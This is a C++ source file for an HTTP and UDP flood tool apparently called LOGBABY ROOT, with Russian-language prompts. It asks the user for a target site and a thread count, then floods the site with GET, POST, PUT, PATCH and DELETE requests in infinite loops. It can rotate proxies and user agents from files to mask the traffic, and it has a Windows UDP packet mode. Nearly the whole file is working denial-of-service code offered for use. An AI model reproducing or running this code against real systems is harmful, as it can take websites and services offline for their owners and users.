#if _WIN64
#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#endif

#include <iostream>
#include <mutex>
#include <string>
#include <thread>
#include <vector>
#include <fstream>
#include <ctime>
#include <clocale>
#if _WIN64
#include <winsock2.h>
#endif
#include "cpr/cpr.h"

#pragma warning(disable : 4996)
#pragma warning(disable : 6387)

#if _WIN64
#pragma comment(lib, "ws2_32.lib")
#define PORT 10004
#define BUFSIZE 1024
#endif

void __genConfidentKey() {

}

struct TypeThreading {
  std::vector<std::thread> threadsPost;
  std::vector<std::thread> threadsGet;
  std::vector<std::thread> threadsPatch;
  std::vector<std::thread> threadsPut;
  std::vector<std::thread> threadsDelete;
  std::vector<std::thread> threadsUDP;
} typeofThread;

struct TypeMutex {
  std::mutex threads_post_access;
  std::mutex threads_get_access;
  std::mutex threads_patch_access;
  std::mutex threads_put_access;
  std::mutex threads_delete_access;
  std::mutex threads_udp_access;
} typeofMutex;

struct StatisticsUser {
  bool isHttp = false;
  bool isUdp = false;
  bool isProxy = false;
  bool isUserAgent = false;
  bool isGet = false;
  bool isPost = false;
  bool isPatch = false;
  bool isPut = false;
  bool isDelete = false;
} statistic;

inline int __findCountOfStrings(std::string param) {
  char buffer[1024];
  int counter = 0;
  std::ifstream file(param);
  while (!file.eof()) {
    file.getline(buffer, 1024, '\n');
    counter++;
  }
  file.close();
  return counter;
}

inline std::string __getRandomUserAgent() {
  std::ifstream in("users.txt");
  int countStrings = __findCountOfStrings("users.txt");
  int randomString_index = std::rand() % countStrings + 1;
  std::string resultUserAgent{};
  for (int i = 0; i < randomString_index; i++) {
    getline(in, resultUserAgent);
  }
  in.close();
  return resultUserAgent;
}

inline std::string __getRandomProxy() {
  std::ifstream in("proxies.txt");
  int countStrings = __findCountOfStrings("proxies.txt");
  int randomString_index = std::rand() % countStrings + 1;
  std::string resultProxie{};
  for (int i = 0; i < randomString_index; i++) {
    getline(in, resultProxie);
  }
  in.close();
  return resultProxie;
}

#if _WIN64
void anim() {
  std::cout << "S";
  Sleep(50);
  system("cls");
  std::cout << "OS";
  Sleep(50);
  system("cls");
  std::cout << "DOS";
  Sleep(50);
  system("cls");

  std::string DDOS = "DDOS";
  for (int i = 0; i < 10; i++) {
    std::cout << DDOS;
    DDOS.insert(DDOS.begin(), ' ');
    Sleep(50);
    system("cls");
  }
}
#endif

class Attack {
 private:
  cpr::Response postResponse;
  cpr::Response getResponse;
  cpr::Response putResponse;
  cpr::Response patchResponse;
  cpr::Response deleteResponse;
  std::string site{};
  std::string ipofSite{};
  std::string gotIpofSite{};
  #if _WIN64
  WSADATA winsockData{};
  SOCKET serverSocket{};
  SOCKADDR_IN serverAddr{};
  SOCKADDR_IN clientAddr{};
  bool isUDP_flood = false;
  #endif
  int countThreads = 0;
  int countUdpPackets = 0;

  bool isValidateSite() {
    postResponse = cpr::Post(cpr::Url(site));
    getResponse = cpr::Get(cpr::Url(site));
    if (getResponse.status_code == 200 || postResponse.status_code == 200) {
      return true;
    }
    return false;
  }

  inline void takeError() {
    if (postResponse.status_code != 200)
      std::cout << "Server maybe knocked down! Check it!" << std::endl;
  }

  inline void showLogo() {
    setlocale(LC_ALL, "rus");
    #if _WIN64
    system("color 2");
    anim();
    #endif
    std::cout
        << "¶¶`````````¶¶¶¶``````¶¶¶¶`````¶¶¶¶¶``````¶¶¶¶`````¶¶¶¶¶`````¶¶``¶¶"
        << std::endl;
    std::cout
        << "¶¶````````¶¶``¶¶````¶¶````````¶¶``¶¶````¶¶``¶¶````¶¶``¶¶`````¶¶¶¶`"
        << std::endl;
    std::cout
        << "¶¶````````¶¶``¶¶````¶¶`¶¶¶````¶¶¶¶¶`````¶¶¶¶¶¶````¶¶¶¶¶```````¶¶``"
        << std::endl;
    std::cout
        << "¶¶````````¶¶``¶¶````¶¶``¶¶````¶¶``¶¶````¶¶``¶¶````¶¶``¶¶``````¶¶``"
        << std::endl;
    std::cout
        << "¶¶¶¶¶¶`````¶¶¶¶``````¶¶¶¶`````¶¶¶¶¶`````¶¶``¶¶````¶¶¶¶¶```````¶¶``"
        << std::endl
        << std::endl;

    std::cout << "¶¶¶¶¶``````¶¶¶¶``````¶¶¶¶`````¶¶¶¶¶¶" << std::endl;
    std::cout << "¶¶``¶¶````¶¶``¶¶````¶¶``¶¶``````¶¶``" << std::endl;
    std::cout << "¶¶¶¶¶`````¶¶``¶¶````¶¶``¶¶``````¶¶``" << std::endl;
    std::cout << "¶¶``¶¶````¶¶``¶¶````¶¶``¶¶``````¶¶``" << std::endl;
    std::cout << "¶¶``¶¶`````¶¶¶¶``````¶¶¶¶```````¶¶``" << std::endl
              << std::endl;
    std::cout << "Version 1.2" << std::endl;
    std::cout << "vk.com/logbaby" << std::endl;
    std::cout << "t.me/logbaby" << std::endl;
    std::cout << "-----------------------------\n";
  }

 public:
  void setSite() {
    showLogo();
    if (statistic.isHttp == true) {
     do {
        std::cout << "Введите ссылку на сайт:" << std::endl;
        std::cout << "Например: https://futsafe.ru/ или futsafe.ru"
                  << std::endl;
        std::cout << ">>> ";
        std::cin >> site;
        std::cout << "Обработка..." << std::endl;
     } while (!isValidateSite());
    }

    #if _WIN64
    if (statistic.isUdp == true) {
      std::cout << "Введите IP адрес:" << std::endl;
      std::cout << ">>> ";
      std::cin >> ipofSite;
      if (ipofSite == "n" || ipofSite == "N" || ipofSite == "Н" ||
          ipofSite == "н") {
        isUDP_flood = false;
      } else {
        isUDP_flood = true;
      }
    }
    #endif

    if (statistic.isHttp == true) {
      std::cout << "Введите количество воркеров:" << std::endl;
      std::cout << "Например: 666" << std::endl;
      std::cout << ">>> ";
      std::cin >> countThreads;
    } else if (statistic.isUdp == true) {
      std::cout << "Введите количество UDP пакетов:" << std::endl;
      std::cout << "Например: 4000" << std::endl;
      std::cout << ">>> ";
      std::cin >> countUdpPackets;
    }

    if (statistic.isHttp == true) {
      if (statistic.isPost == true) {
        typeofMutex.threads_post_access.lock();
        typeofThread.threadsPost.resize(countThreads);
        typeofMutex.threads_post_access.unlock();
      }

      if (statistic.isGet == true) {
        typeofMutex.threads_get_access.lock();
        typeofThread.threadsGet.resize(countThreads);
        typeofMutex.threads_get_access.unlock();
      }

      if (statistic.isPatch == true) {
        typeofMutex.threads_patch_access.lock();
        typeofThread.threadsPatch.resize(countThreads);
        typeofMutex.threads_patch_access.unlock();
      }

      if (statistic.isPut == true) {
        typeofMutex.threads_put_access.lock();
        typeofThread.threadsPut.resize(countThreads);
        typeofMutex.threads_put_access.unlock();
      }

      if (statistic.isDelete == true) {
        typeofMutex.threads_delete_access.lock();
        typeofThread.threadsDelete.resize(countThreads);
        typeofMutex.threads_delete_access.unlock();
      }
    }

    #if _WIN64
    if (statistic.isUdp == true) {
      typeofMutex.threads_udp_access.lock();
      typeofThread.threadsUDP.resize(countUdpPackets);
      typeofMutex.threads_udp_access.unlock();
    }
    #endif
  }

  #if _WIN64
  bool getStatus() { return isUDP_flood; }
  #endif

  inline void sendPost() {
    if (statistic.isUserAgent == true && statistic.isProxy == true) {
      postResponse =
          cpr::Post(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}},
                    cpr::Proxies{{__getRandomProxy(), site}});
      if (postResponse.status_code == 200) {
        std::cout << "Send POST response with user agents and with proxy [+]" << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
      postResponse =
          cpr::Post(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}});
      if (postResponse.status_code == 200) {
        std::cout << "Send POST response with user agents and without proxy [+]" << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
      postResponse =
          cpr::Post(cpr::Url(site), cpr::Proxies{{__getRandomProxy(), site}});
      if (postResponse.status_code == 200) {
        std::cout << "Send POST response without user agents and with proxy [+]" << std::endl;
      }
      takeError();
    } else {
      postResponse = cpr::Post(cpr::Url(site));
      if (postResponse.status_code == 200) {
        std::cout << "Send POST response without proxy and user agents [+]" << std::endl;
      }
      takeError();
    }
  }

  inline void sendGet() {
    if (statistic.isUserAgent == true && statistic.isProxy == true) {
      getResponse =
          cpr::Get(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}},
                    cpr::Proxies{{__getRandomProxy(), site}});
      if (getResponse.status_code == 200) {
        std::cout << "Send GET response with user agents and with proxy [+]"
                  << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
      getResponse =
          cpr::Get(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}});
      if (getResponse.status_code == 200) {
        std::cout << "Send GET response with user agents and without proxy [+]"
                  << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
      getResponse =
          cpr::Get(cpr::Url(site), cpr::Proxies{{__getRandomProxy(), site}});
      if (getResponse.status_code == 200) {
        std::cout << "Send GET response without user agents and with proxy [+]"
                  << std::endl;
      }
      takeError();
    } else {
      getResponse = cpr::Get(cpr::Url(site));
      if (getResponse.status_code == 200) {
        std::cout << "Send GET response without proxy and user agents [+]"
                  << std::endl;
      }
      takeError();
    }
  }

  inline void sendPut() {
    if (statistic.isUserAgent == true && statistic.isProxy == true) {
      putResponse =
          cpr::Put(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}},
                   cpr::Proxies{{__getRandomProxy(), site}});
      if (putResponse.status_code == 200) {
        std::cout << "Send PUT response with user agents and with proxy [+]"
                  << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
      putResponse =
          cpr::Put(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}});
      if (putResponse.status_code == 200) {
        std::cout << "Send PUT response with user agents and without proxy [+]"
                  << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
      putResponse =
          cpr::Put(cpr::Url(site), cpr::Proxies{{__getRandomProxy(), site}});
      if (putResponse.status_code == 200) {
        std::cout << "Send PUT response without user agents and with proxy [+]"
                  << std::endl;
      }
      takeError();
    } else {
      putResponse = cpr::Put(cpr::Url(site));
      if (putResponse.status_code == 200) {
        std::cout << "Send PUT response without proxy and user agents [+]"
                  << std::endl;
      }
      takeError();
    }
  }

  inline void sendPatch() { 
      if (statistic.isUserAgent == true && statistic.isProxy == true) {
      patchResponse =
          cpr::Patch(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}},
                   cpr::Proxies{{__getRandomProxy(), site}});
        if (patchResponse.status_code == 200) {
        std::cout << "Send PATCH response with user agents and with proxy [+]"
                  << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
        patchResponse =
          cpr::Patch(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}});
      if (patchResponse.status_code == 200) {
        std::cout << "Send PATCH response with user agents and without proxy [+]"
                  << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
      patchResponse =
          cpr::Patch(cpr::Url(site), cpr::Proxies{{__getRandomProxy(), site}});
      if (patchResponse.status_code == 200) {
        std::cout << "Send PATCH response without user agents and with proxy [+]"
                  << std::endl;
      }
      takeError();
    } else {
      patchResponse = cpr::Patch(cpr::Url(site));
      if (patchResponse.status_code == 200) {
        std::cout << "Send PATCH response without proxy and user agents [+]"
                  << std::endl;
      }
      takeError();
    }
  }

  inline void sendDelete() {
    if (statistic.isUserAgent == true && statistic.isProxy == true) {
      deleteResponse =
          cpr::Delete(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}},
                     cpr::Proxies{{__getRandomProxy(), site}});
      if (deleteResponse.status_code == 200) {
        std::cout << "Send DELETE response with user agents and with proxy [+]"
                  << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == true && statistic.isProxy == false) {
      deleteResponse =
          cpr::Delete(cpr::Url(site), cpr::UserAgent{{__getRandomUserAgent()}});
      if (deleteResponse.status_code == 200) {
        std::cout
            << "Send DELETE response with user agents and without proxy [+]"
            << std::endl;
      }
      takeError();
    } else if (statistic.isUserAgent == false && statistic.isProxy == true) {
      deleteResponse =
          cpr::Delete(cpr::Url(site), cpr::Proxies{{__getRandomProxy(), site}});
      if (deleteResponse.status_code == 200) {
        std::cout
            << "Send DELETE response without user agents and with proxy [+]"
            << std::endl;
      }
      takeError();
    } else {
      deleteResponse = cpr::Delete(cpr::Url(site));
      if (deleteResponse.status_code == 200) {
        std::cout << "Send DELETE response without proxy and user agents [+]"
                  << std::endl;
      }
      takeError();
    }
  }

  #if _WIN64
  inline void udpSend() {
    char msg1[] = "prodby_logbaby";
    char buf[BUFSIZE];
    char msg2[] = "2017111341";
    int sendLen, recvLen, clientSize;

    if (WSAStartup(0x202, &winsockData) == SOCKET_ERROR) {
      std::cout << "Socket init failed [-]" << std::endl;
      WSACleanup();
      exit(1);
    }
    std::cout << "Socket init [+]" << std::endl;
    memset(&serverAddr, 0, sizeof(serverAddr));
    memset(&clientAddr, 0, sizeof(clientAddr));
    memset(buf, 0, BUFSIZE);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(ipofSite.c_str());
    serverAddr.sin_port = htons(PORT);

    serverSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (serverSocket == INVALID_SOCKET) {
      std::cout << "Socket creation failed [-]" << std::endl;
      WSACleanup();
      exit(1);
    }
    std::cout << "Socket create [+]" << std::endl;

    sendLen = sendto(serverSocket, msg1, sizeof(msg1), 0,
                     (struct sockaddr *)&serverAddr, sizeof(serverAddr));
    if (sendLen != sizeof(msg1)) {
      std::cout << "Sending error [-]" << std::endl;
      exit(1);
    }

    clientSize = sizeof(clientAddr);
    recvLen = recvfrom(serverSocket, buf, BUFSIZE, 0,
                       (struct sockaddr *)&clientAddr, &clientSize);
    if (recvLen < 0) {
      exit(1);
    }

    int i = 0;
    char *sArr[10] = {
        NULL,
    };
    char *ptr1 = strtok(buf, "_");
    while (ptr1 != NULL) {
      sArr[i] = ptr1;
      i++;
      ptr1 = strtok(NULL, ":");
    }
    char *ptr2 = strstr(buf + 18, "7");
    int num = atoi(ptr2);

    clientAddr.sin_family = AF_INET;
    clientAddr.sin_addr.s_addr = inet_addr(sArr[1]);
    clientAddr.sin_port = htons(num);
    for (int count = 0; count < 10; count++) {
      sendLen = sendto(serverSocket, msg2, sizeof(msg2), 0,
                       (struct sockaddr *)&clientAddr, sizeof(clientAddr));
      if (sendLen != sizeof(msg2)) {
        std::cout << "Sending error [-]" << std::endl;
        exit(1);
      }
    }
    closesocket(serverSocket);
  }
  #endif
};

inline void dosPost(Attack site) {
  while (true) {
    site.sendPost();
  }
}

inline void dosGet(Attack site) {
  while (true) {
    site.sendGet();
  }
}

inline void dosPut(Attack site) {
  while (true) {
    site.sendPut();
  }
}

inline void dosDelete(Attack site) {
  while (true) {
    site.sendDelete();
  }
}

inline void dosPatch(Attack site) {
  while (true) {
    site.sendPatch();
  }
}

#if _WIN64
inline void udpSend(Attack site) {
  while (true) {
    site.udpSend();
  }
}
#endif

enum class CommandType { HTTP = 1, UDP };
enum class HttpResponseType { GET = 1, POST, PUT, r_DELETE, PATCH, EXIT };
enum class AttackType { PROXY = 1, USER_AGENT, EXIT };

int main() {
  std::srand(std::time(nullptr));
  setlocale(LC_ALL, "rus");

  #if _WIN64
  system("color 4");
  #endif
  std::cout << "Введите тип атаки: (1 или 2)" << std::endl;
  std::cout << static_cast<int>(CommandType::HTTP) << "# HTTP атака (по Url)"
            << std::endl;

  #if _WIN64
  std::cout << static_cast<int>(CommandType::UDP) << "# UDP атака (по IP)"
            << std::endl;
  #endif

  int *command = new int;
  std::cout << ">>> ";
  std::cin >> *command;

  if (*command < 1 || *command > 2) {
    do {
      std::cout << "Введены неверные данные! Попробуйте еще раз!" << std::endl;
      std::cin >> *command;
    } while (*command < static_cast<int>(CommandType::HTTP) ||
             *command > static_cast<int>(CommandType::UDP));
  }

  if (*command == static_cast<int>(CommandType::HTTP)) statistic.isHttp = true;
  if (*command == static_cast<int>(CommandType::UDP)) statistic.isUdp = true;
  delete command;

  if (statistic.isHttp == true) {
    std::cout
        << "Введите типы запросов которые вы будете отправлять:(введите цифру)"
        << std::endl;
    std::cout << static_cast<int>(HttpResponseType::GET) << "# Get запросы"
              << std::endl;
    std::cout << static_cast<int>(HttpResponseType::POST) << "# Post запросы"
              << std::endl;
    std::cout << static_cast<int>(HttpResponseType::PUT) << "# Put запросы"
              << std::endl;
    std::cout << static_cast<int>(HttpResponseType::r_DELETE)
              << "# Delete запросы" << std::endl;
    std::cout << static_cast<int>(HttpResponseType::PATCH) << "# Patch запросы"
              << std::endl;
    std::cout << static_cast<int>(HttpResponseType::EXIT)
              << "# Закончить выбор и перейти к атаке" << std::endl;

    int *responseType = new int;
    *responseType = 0;

    while (*responseType != static_cast<int>(HttpResponseType::EXIT)) {
      std::cout << ">>> ";
      std::cin >> *responseType;

      if (*responseType < static_cast<int>(HttpResponseType::GET) ||
          *responseType > static_cast<int>(HttpResponseType::EXIT)) {
        do {
          std::cout << "Введены неверные символы! Попробуйте еще раз:"
                    << std::endl;
          std::cout << ">>> ";
          std::cin >> *responseType;
        } while (*responseType < static_cast<int>(HttpResponseType::GET) ||
                 *responseType > static_cast<int>(HttpResponseType::EXIT));
      }

      switch (*responseType) {
        case static_cast<int>(HttpResponseType::GET):
          std::cout << "Отправка Get запросов включена!" << std::endl;
          statistic.isGet = true;
          break;
        case static_cast<int>(HttpResponseType::POST):
          std::cout << "Отправка Post запросов включена!" << std::endl;
          statistic.isPost = true;
          break;
        case static_cast<int>(HttpResponseType::PUT):
          std::cout << "Отправка Put запросов включена!" << std::endl;
          statistic.isPut = true;
          break;
        case static_cast<int>(HttpResponseType::r_DELETE):
          std::cout << "Отправка Delete запросов включена!" << std::endl;
          statistic.isDelete = true;
          break;
        case static_cast<int>(HttpResponseType::PATCH):
          std::cout << "Отправка Patch запросов включена!" << std::endl;
          statistic.isPatch = true;
          break;
      }
    }

    delete responseType;
  }

  if (statistic.isHttp == true) {
    std::cout
        << "Введите будете ли вы использовать прокси или юзер агенты:(1 или 2)"
        << std::endl;
    std::cout << static_cast<int>(AttackType::PROXY)
              << "# Включить прокси (можете добавить свои в файл proxies.txt)"
              << std::endl;
    std::cout << static_cast<int>(AttackType::USER_AGENT)
              << "# Включить Рандомизатор юзер агентов (можете добавить свои в "
                 "файл users.txt)"
              << std::endl;
    std::cout << static_cast<int>(AttackType::EXIT)
              << "# Закончить выбор и приступить к выполнению атаки"
              << std::endl;

    int *comand = new int;
    *comand = 0;
    while (*comand != static_cast<int>(AttackType::EXIT)) {
      std::cout << ">>> ";
      std::cin >> *comand;

      if (*comand < static_cast<int>(AttackType::PROXY) ||
          *comand > static_cast<int>(AttackType::EXIT)) {
        do {
          std::cout << "Введены неверные данные! Попробуйте еще раз!"
                    << std::endl;
          std::cout << ">>> ";
          std::cin >> *comand;
        } while (*comand < static_cast<int>(AttackType::PROXY) ||
                 *comand > static_cast<int>(AttackType::EXIT));
      }

      if (*comand == static_cast<int>(AttackType::PROXY)) {
        std::cout << "Отправка запросов через PROXY включена!" << std::endl;
        statistic.isProxy = true;
      } else if (*comand == static_cast<int>(AttackType::USER_AGENT)) {
        std::cout << "Отправка запросов с применением User Agents включена!"
                  << std::endl;
        statistic.isUserAgent = true;
      }
    }
    delete comand;
  }

  #if _WIN64
  system("pause");
  system("cls");
  #endif

  Attack site;
  site.setSite();

  if (statistic.isPost == true) {
    typeofMutex.threads_post_access.lock();
    for (int i = 0; i < typeofThread.threadsPost.size(); i++) {
      typeofThread.threadsPost[i] = std::thread(dosPost, site);
    }
    typeofMutex.threads_post_access.unlock();
  }

  if (statistic.isGet == true) {
    typeofMutex.threads_get_access.lock();
    for (int i = 0; i < typeofThread.threadsGet.size(); i++) {
      typeofThread.threadsGet[i] = std::thread(dosGet, site);
    }
    typeofMutex.threads_get_access.unlock();
  }

  if (statistic.isPatch == true) {
    typeofMutex.threads_patch_access.lock();
    for (int i = 0; i < typeofThread.threadsPatch.size(); i++) {
      typeofThread.threadsPatch[i] = std::thread(dosPatch, site);
    }
    typeofMutex.threads_patch_access.unlock();
  }

  if (statistic.isPut == true) {
    typeofMutex.threads_put_access.lock();
    for (int i = 0; i < typeofThread.threadsPut.size(); i++) {
      typeofThread.threadsPut[i] = std::thread(dosPut, site);
    }
    typeofMutex.threads_put_access.unlock();
  }

  if (statistic.isDelete == true) {
    typeofMutex.threads_delete_access.lock();
    for (int i = 0; i < typeofThread.threadsDelete.size(); i++) {
      typeofThread.threadsDelete[i] = std::thread(dosDelete, site);
    }
    typeofMutex.threads_delete_access.unlock();
  }

  #if _WIN64
  if (site.getStatus() == true) {
    typeofMutex.threads_udp_access.lock();
    for (int i = 0; i < typeofThread.threadsUDP.size(); i++) {
      typeofThread.threadsUDP[i] = std::thread(udpSend, site);
    }
    typeofMutex.threads_udp_access.unlock();
  }
  #endif

  #if _WIN64
  if (site.getStatus() == true) {
    typeofMutex.threads_udp_access.lock();
    for (int i = 0; i < typeofThread.threadsUDP.size(); i++) {
      typeofThread.threadsUDP[i].join();
    }
    typeofMutex.threads_udp_access.unlock();
  }
  #endif

  if (statistic.isPost == true) {
    typeofMutex.threads_post_access.lock();
    for (int i = 0; i < typeofThread.threadsPost.size(); i++) {
      typeofThread.threadsPost[i].join();
    }
    typeofMutex.threads_post_access.unlock();
  }

  if (statistic.isGet == true) {
    typeofMutex.threads_get_access.lock();
    for (int i = 0; i < typeofThread.threadsGet.size(); i++) {
      typeofThread.threadsGet[i].join();
    }
    typeofMutex.threads_get_access.unlock();
  }

  if (statistic.isPut == true) {
   typeofMutex.threads_put_access.lock();
   for (int i = 0; i < typeofThread.threadsPut.size(); i++) {
     typeofThread.threadsPut[i].join();
   }
   typeofMutex.threads_put_access.unlock();
  }

  if (statistic.isDelete == true) {
    typeofMutex.threads_delete_access.lock();
    for (int i = 0; i < typeofThread.threadsDelete.size(); i++) {
      typeofThread.threadsDelete[i].join();
    }
    typeofMutex.threads_delete_access.unlock();
  }

  if (statistic.isPatch == true) {
    typeofMutex.threads_patch_access.lock();
    for (int i = 0; i < typeofThread.threadsPatch.size(); i++) {
      typeofThread.threadsPatch[i].join();
    }
    typeofMutex.threads_patch_access.unlock();
  }
}